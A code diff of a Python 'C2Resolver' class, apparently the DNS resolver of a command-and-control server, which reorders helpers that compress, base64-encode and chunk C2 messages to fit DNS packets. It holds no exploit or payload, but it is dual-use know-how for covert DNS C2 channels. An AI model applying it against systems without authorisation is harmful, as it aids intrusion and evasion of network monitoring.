@@ -110,61 +110,6 @@ class C2Resolver(BaseResolver):
         self.response_handler_lock = multiprocessing.Lock()
         pass
 
-    @staticmethod
-    def decode_bytes(s):
-        """
-        Receives a zlib compressed base64 string and returns the plaintext.
-
-        :param s: Zlib compressed, base64 encoded string
-        :type s: str
-        :return: plaintext
-        :rtype: str
-        """
-        return str(zlib.decompress(urlsafe_b64decode(s)).decode().replace('\n', ''))
-
-    @staticmethod
-    def encode_string(s):
-        """
-        Receives a plaintext string, zlib compresses it, and encodes it into a base64 string.
-
-        :param s: plaintext string
-        :type s: str
-        :return: Zlib compressed, base64 encoded string
-        :rtype: str
-        """
-        return str(urlsafe_b64encode(zlib.compress(s.encode(), 9)).decode())
-
-    @staticmethod
-    def chunk_string(s, n=150):
-        """
-        Takes a string and splits it into x chunks of n length.
-
-        :param s: string
-        :type s: str
-        :param n: Number of characters per chunk
-        :type n: int
-        :return: Array of n-length chunks of original string
-        :rtype: list
-        """
-        return [s[i:i+n] for i in range(0, len(s), n)]
-
-    @staticmethod
-    def chunk_data_for_packets(data, chunk_size):
-        """
-        Takes a list of string chunks and creates a list of `chunk_size` lists from the original data.
-
-        :param data: list of string chunks
-        :type data: list
-        :param chunk_size: number of string chunks per data chunk
-        :type chunk_size: int
-        :return: List of `chunk_size` lists from original string chunk list.
-        """
-        ret = []
-        while len(data) > 0:
-            ret.append(data[:chunk_size])
-            del data[:chunk_size]
-        return ret
-
     async def handle_message(self, req_type, data):
         """
         Handle requests depending on their request type.
@@ -240,7 +185,7 @@ class C2Resolver(BaseResolver):
                     response = dict(success=True, data=result)
                     response = self.chunk_string(self.encode_string(json.dumps(response)))
                     if len(response) > 2:
-                        # data needs to be chunked
+                        # data needs to be chunked due to DNS UDP packet size limitations
                         self.transmissions[tid].response = deque(self.chunk_data_for_packets(response, 2))
                         print(self.transmissions[tid].response)
                         chunk_msg = dict(success=True, chunked=True, total_chunks=len(self.transmissions[tid].response))
@@ -347,6 +292,61 @@ class C2Resolver(BaseResolver):
         else:
             resp.add_answer(rrs)
         return resp
+
+    @staticmethod
+    def decode_bytes(s):
+        """
+        Receives a zlib compressed base64 string and returns the plaintext.
+
+        :param s: Zlib compressed, base64 encoded string
+        :type s: str
+        :return: plaintext
+        :rtype: str
+        """
+        return str(zlib.decompress(urlsafe_b64decode(s)).decode().replace('\n', ''))
+
+    @staticmethod
+    def encode_string(s):
+        """
+        Receives a plaintext string, zlib compresses it, and encodes it into a base64 string.
+
+        :param s: plaintext string
+        :type s: str
+        :return: Zlib compressed, base64 encoded string
+        :rtype: str
+        """
+        return str(urlsafe_b64encode(zlib.compress(s.encode(), 9)).decode())
+
+    @staticmethod
+    def chunk_string(s, n=150):
+        """
+        Takes a string and splits it into x chunks of n length. The default is 150 to safely account for DNS overhead.
+
+        :param s: string
+        :type s: str
+        :param n: Number of characters per chunk
+        :type n: int
+        :return: Array of n-length chunks of original string
+        :rtype: list
+        """
+        return [s[i:i+n] for i in range(0, len(s), n)]
+
+    @staticmethod
+    def chunk_data_for_packets(data, chunk_size):
+        """
+        Takes a list of string chunks and creates a list of `chunk_size` lists from the original data.
+
+        :param data: list of string chunks
+        :type data: list
+        :param chunk_size: number of string chunks per data chunk
+        :type chunk_size: int
+        :return: List of `chunk_size` lists from original string chunk list.
+        """
+        ret = []
+        while len(data) > 0:
+            ret.append(data[:chunk_size])
+            del data[:chunk_size]
+        return ret
 
 
 class DNS(C2Passive):
